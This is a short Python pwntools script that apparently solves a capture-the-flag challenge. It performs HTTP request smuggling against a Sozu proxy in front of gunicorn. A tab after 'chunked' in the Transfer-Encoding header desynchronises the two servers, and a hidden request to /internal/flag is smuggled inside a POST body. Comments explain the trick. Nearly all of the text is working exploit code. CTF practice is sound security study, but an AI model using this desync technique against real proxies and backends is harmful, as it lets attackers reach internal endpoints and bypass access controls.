from pwn import *
import ssl

hostname = 'sozu.chall.pwnoh.io'
ctx = ssl.create_default_context()
#ctx.check_hostname = False
#ctx.verify_mode = ssl.CERT_NONE
sock = socket.create_connection((hostname, 13380))
ssock = ctx.wrap_socket(sock, server_hostname=hostname)

r = remote(hostname, "13380", sock=ssock)

# The solution here is the tab after 'chunked'.
# sozu will use content-length, gunicorn will use
# chunked.

# You do actually need another request after getting
# the flag, otherwise you won't get the response back

#r = remote("localhost", "3000")

r.send("""POST /public/testing HTTP/1.1\r
Host: sozu.chall.pwnoh.io\r
Connection: keep-alive\r
transfer-encoding: chunked\t\r
content-length: 60\r
\r
2\r
hi\r
0\r
\r
GET /internal/flag HTTP/1.1\r
Host: localhost\r
\r
GET /public/test HTTP/1.1\r
Host: sozu.chall.pwnoh.io\r
\r
""")
r.interactive()

